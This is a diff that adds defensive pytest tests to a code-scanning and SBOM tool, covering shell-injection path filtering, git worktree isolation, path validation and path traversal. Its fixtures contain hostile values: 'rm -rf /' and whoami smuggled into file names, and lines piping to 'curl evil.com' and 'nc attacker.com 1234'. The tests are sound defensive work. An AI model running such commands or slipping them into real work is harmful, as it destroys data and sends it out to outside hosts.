@@ -440,6 +440,260 @@ class TestScanCode:
         assert files == []
 
 
+class TestPathSanitization:
+    """Finding 1 — Command injection via unsafe diff-extracted paths.
+
+    extract_changed_files and validate_paths must reject paths containing
+    shell metacharacters so they can never be interpolated into subprocess
+    commands downstream.
+    """
+
+    def test_extract_changed_files_rejects_shell_metacharacter_paths(self):
+        """Paths with $(...) in the diff b/ header must not be returned."""
+        from eedom.agent.tool_helpers import extract_changed_files
+
+        malicious_diff = (
+            "diff --git a/safe.txt b/$(rm -rf /)\n"
+            "--- a/safe.txt\n"
+            "+++ b/$(rm -rf /)\n"
+            "@@ -1 +1 @@\n"
+            "-old\n"
+            "+new\n"
+        )
+        files = extract_changed_files(malicious_diff)
+        dangerous = {";", "&", "|", "`", "$", "(", ")"}
+        bad = [f for f in files if any(c in f for c in dangerous)]
+        assert bad == [], f"Dangerous paths returned: {bad}"
+
+    def test_validate_paths_rejects_shell_injection(self):
+        """validate_paths must return empty list for all shell-injected paths."""
+        from eedom.agent.tool_helpers import validate_paths
+
+        malicious_paths = [
+            "test.txt; rm -rf /",
+            "test.txt && curl evil.com",
+            "test.txt | nc attacker.com 1234",
+            "test.txt`whoami`",
+            "test.txt$(whoami)",
+        ]
+        safe_paths = validate_paths(malicious_paths, "/safe/repo")
+        assert len(safe_paths) == 0, f"Expected no safe paths, got: {safe_paths}"
+
+
+class TestGenerateBaseSbom:
+    """Finding 2 — Race condition: git checkout modifies shared working tree.
+
+    _generate_base_sbom must use 'git worktree add/remove' to create an
+    isolated checkout rather than 'git checkout' which changes the shared
+    working directory and races with concurrent operations.
+    """
+
+    def test_uses_worktree_not_checkout(self):
+        """_generate_base_sbom must not call git checkout on the working tree."""
+        from unittest.mock import MagicMock, patch
+
+        from eedom.agent.tool_helpers import _generate_base_sbom
+
+        def run_side_effect(*args, **kwargs):
+            result = MagicMock()
+            result.stdout = ""
+            result.returncode = 0
+            cmd = args[0] if args else []
+            if isinstance(cmd, list) and "merge-base" in cmd:
+                result.stdout = "abc123abc123\n"
+            return result
+
+        with (
+            patch(
+                "eedom.agent.tool_helpers.subprocess.run", side_effect=run_side_effect
+            ) as mock_run,
+            patch("eedom.agent.tool_helpers.run_syft", return_value={"components": []}),
+        ):
+            _generate_base_sbom("/fake/repo")
+
+        calls = mock_run.call_args_list
+        cmds = [c.args[0] for c in calls if c.args and isinstance(c.args[0], list)]
+        checkout_calls = [cmd for cmd in cmds if "checkout" in cmd]
+        worktree_calls = [cmd for cmd in cmds if "worktree" in cmd]
+
+        assert (
+            len(checkout_calls) == 0
+        ), f"Must not use git checkout (race condition): {checkout_calls}"
+        assert (
+            len(worktree_calls) >= 2
+        ), f"Expected worktree add+remove calls, found: {worktree_calls}"
+
+    def test_worktree_cleaned_up_on_syft_failure(self):
+        """The worktree must be removed via 'worktree remove' even if run_syft raises."""
+        from unittest.mock import MagicMock, patch
+
+        from eedom.agent.tool_helpers import _generate_base_sbom
+
+        def run_side_effect(*args, **kwargs):
+            result = MagicMock()
+            result.stdout = ""
+            result.returncode = 0
+            cmd = args[0] if args else []
+            if isinstance(cmd, list) and "merge-base" in cmd:
+                result.stdout = "abc123abc123\n"
+            return result
+
+        with (
+            patch(
+                "eedom.agent.tool_helpers.subprocess.run", side_effect=run_side_effect
+            ) as mock_run,
+            patch(
+                "eedom.agent.tool_helpers.run_syft",
+                side_effect=RuntimeError("syft failed"),
+            ),
+        ):
+            result = _generate_base_sbom("/fake/repo")
+
+        assert result == {"components": []}, "Should return empty baseline on failure"
+        calls = mock_run.call_args_list
+        cmds = [c.args[0] for c in calls if c.args and isinstance(c.args[0], list)]
+        remove_calls = [cmd for cmd in cmds if "worktree" in cmd and "remove" in cmd]
+        assert (
+            len(remove_calls) >= 1
+        ), f"Worktree must be removed on failure, subprocess calls were: {cmds}"
+
+
+class TestRunSyftPathValidation:
+    """Patch 7 — run_syft must validate repo_path before calling subprocess."""
+
+    def test_run_syft_rejects_nonexistent_path(self):
+        """run_syft should raise ValueError for a non-existent repo_path."""
+        from eedom.agent.tool_helpers import run_syft
+
+        nonexistent_path = "/nonexistent/path/that/does/not/exist/12345"
+        with pytest.raises(ValueError, match="repo_path does not exist"):
+            run_syft(nonexistent_path)
+
+    def test_run_syft_rejects_file_path(self, tmp_path):
+        """run_syft should raise ValueError if repo_path is a file, not a directory."""
+        from eedom.agent.tool_helpers import run_syft
+
+        file_path = tmp_path / "test_file.txt"
+        file_path.write_text("test content")
+
+        with pytest.raises(ValueError, match="repo_path is not a directory"):
+            run_syft(str(file_path))
+
+    def test_run_syft_accepts_valid_directory(self, tmp_path):
+        """run_syft should accept a valid directory and proceed to subprocess."""
+        from unittest.mock import MagicMock, patch
+
+        from eedom.agent.tool_helpers import run_syft
+
+        repo_dir = tmp_path / "valid_repo"
+        repo_dir.mkdir()
+
+        mock_result = MagicMock()
+        mock_result.stdout = '{"components": []}'
+
+        with patch("subprocess.run", return_value=mock_result) as mock_run:
+            result = run_syft(str(repo_dir))
+
+        mock_run.assert_called_once()
+        call_args = mock_run.call_args[0][0]
+        assert call_args[1] == f"dir:{repo_dir}"
+        assert result == {"components": []}
+
+    def test_run_syft_handles_symlink_to_directory(self, tmp_path):
+        """run_syft should accept symlinks that point to directories."""
+        from unittest.mock import MagicMock, patch
+
+        from eedom.agent.tool_helpers import run_syft
+
+        real_dir = tmp_path / "real_repo"
+        real_dir.mkdir()
+        symlink_dir = tmp_path / "symlink_repo"
+        symlink_dir.symlink_to(real_dir)
+
+        mock_result = MagicMock()
+        mock_result.stdout = '{"components": []}'
+
+        with patch("subprocess.run", return_value=mock_result) as mock_run:
+            result = run_syft(str(symlink_dir))
+
+        mock_run.assert_called_once()
+        assert result == {"components": []}
+
+
+class TestExtractChangedFilesEdgeCases:
+    """Patch 9 — extract_changed_files must handle deleted binary files."""
+
+    def test_renamed_file_is_extracted(self):
+        """Renamed files should be included in the changed files list."""
+        from eedom.agent.tool_helpers import extract_changed_files
+
+        diff = (
+            "diff --git a/old_name.py b/new_name.py\n"
+            "similarity index 100%\n"
+            "rename from old_name.py\n"
+            "rename to new_name.py\n"
+        )
+        result = extract_changed_files(diff)
+        assert result == ["new_name.py"]
+
+    def test_binary_file_modification_is_extracted(self):
+        """Binary files marked with 'Binary files ... differ' should be included."""
+        from eedom.agent.tool_helpers import extract_changed_files
+
+        diff = (
+            "diff --git a/image.png b/image.png\n"
+            "Binary files a/image.png and b/image.png differ\n"
+        )
+        result = extract_changed_files(diff)
+        assert result == ["image.png"]
+
+    def test_deleted_binary_file_is_not_extracted(self):
+        """Deleted binary files (Binary files ... /dev/null differ) must be excluded."""
+        from eedom.agent.tool_helpers import extract_changed_files
+
+        diff = (
+            "diff --git a/deleted.bin b/deleted.bin\n"
+            "deleted file mode 100644\n"
+            "Binary files a/deleted.bin and /dev/null differ\n"
+        )
+        result = extract_changed_files(diff)
+        assert result == []
+
+    def test_binary_file_with_mode_change_is_extracted(self):
+        """Binary files with mode changes (but not deleted) should be extracted."""
+        from eedom.agent.tool_helpers import extract_changed_files
+
+        diff = (
+            "diff --git a/script.sh b/script.sh\n"
+            "old mode 100644\n"
+            "new mode 100755\n"
+            "Binary files a/script.sh and b/script.sh differ\n"
+        )
+        result = extract_changed_files(diff)
+        assert result == ["script.sh"]
+
+    def test_multiple_diffs_with_renames_and_binary(self):
+        """Complex diff with rename, binary modification, and deleted file."""
+        from eedom.agent.tool_helpers import extract_changed_files
+
+        diff = (
+            "diff --git a/old.py b/new.py\n"
+            "similarity index 100%\n"
+            "rename from old.py\n"
+            "rename to new.py\n"
+            "diff --git a/image.png b/image.png\n"
+            "Binary files a/image.png and b/image.png differ\n"
+            "diff --git a/deleted.txt b/deleted.txt\n"
+            "deleted file mode 100644\n"
+            "--- a/deleted.txt\n"
+            "+++ /dev/null\n"
+            "@@ -1 +0,0 @@\n"
+            "-content\n"
+        )
+        result = extract_changed_files(diff)
+        assert set(result) == {"new.py", "image.png"}
+
+
 class TestRegistryRouting:
     """Verify that each scan tool routes through PluginRegistry, not direct runner imports.
 
@@ -649,3 +903,79 @@ class TestRegistryRouting:
 
         assert result["status"] == "error"
         assert "timeout" in result["error"].lower()
+
+
+class TestBuildDepSummaryPathTraversal:
+    """CRITICAL: _build_dep_summary must reject path traversal in repo_path
+    and sanitize component names from SBOM data.
+
+    wave4-patch-4: Path traversal via unvalidated SBOM JSON paths.
+    """
+
+    def test_traversal_path_does_not_read_outside_repo(self, tmp_path):
+        """Before fix: traversal reads sentinel dep from outside repo.
+        After fix: returns {} without touching the sensitive directory.
+        """
+        import json as _json
+
+        from eedom.agent.tools import _build_dep_summary
+
+        # Sensitive dir has a package.json with a sentinel dep.
+        sensitive = tmp_path / "sensitive"
+        sensitive.mkdir()
+        (sensitive / "package.json").write_text(
+            _json.dumps({"dependencies": {"sentinel-evil-pkg": "9.9.9"}})
+        )
+
+        # The repo dir exists but has no package.json of its own.
+        repo = tmp_path / "repo"
+        repo.mkdir()
+
+        # Construct a traversal path: repo/../sensitive  (not yet OS-resolved)
+        traversal = str(repo) + "/../sensitive"
+
+        raw_sbom = {"components": [], "dependencies": []}
+        result = _build_dep_summary(raw_sbom, traversal)
+
+        # After fix: must return {} without reading sensitive/package.json.
+        # Before fix: reads it and includes "sentinel-evil-pkg" in direct.
+        evil = [d for d in result.get("direct", []) if d["name"] == "sentinel-evil-pkg"]
+        assert (
+            evil == []
+        ), f"Path traversal allowed reading 'sentinel-evil-pkg' from outside repo: {result}"
+
+    def test_sbom_absolute_path_names_are_sanitized_in_shared(self, tmp_path):
+        """SBOM component names that look like filesystem paths must not appear verbatim
+        in the shared list.
+        Before fix: '/etc/passwd' appears as-is in shared[].name.
+        After fix: the value is sanitized (leading slash stripped).
+        """
+        from eedom.agent.tools import _build_dep_summary
+
+        repo = tmp_path / "repo"
+        repo.mkdir()
+
+        # Build an SBOM where the evil component is depended on by 3+ packages
+        # so it exceeds the shared threshold (count >= 3).
+        raw_sbom = {
+            "components": [
+                {"purl": "pkg:npm/evil", "name": "/etc/passwd", "version": "1.0.0"},
+                {"purl": "pkg:npm/p1", "name": "parent1", "version": "1.0.0"},
+                {"purl": "pkg:npm/p2", "name": "parent2", "version": "1.0.0"},
+                {"purl": "pkg:npm/p3", "name": "parent3", "version": "1.0.0"},
+            ],
+            "dependencies": [
+                {"ref": "pkg:npm/p1", "dependsOn": ["pkg:npm/evil"]},
+                {"ref": "pkg:npm/p2", "dependsOn": ["pkg:npm/evil"]},
+                {"ref": "pkg:npm/p3", "dependsOn": ["pkg:npm/evil"]},
+            ],
+        }
+
+        result = _build_dep_summary(raw_sbom, str(repo))
+
+        # After fix: shared names must not start with "/" or contain "..".
+        for item in result.get("shared", []):
+            assert not item["name"].startswith(
+                "/"
+            ), f"Absolute path leaked into shared: {item['name']!r}"
+            assert ".." not in item["name"], f"Traversal sequence in shared name: {item['name']!r}"
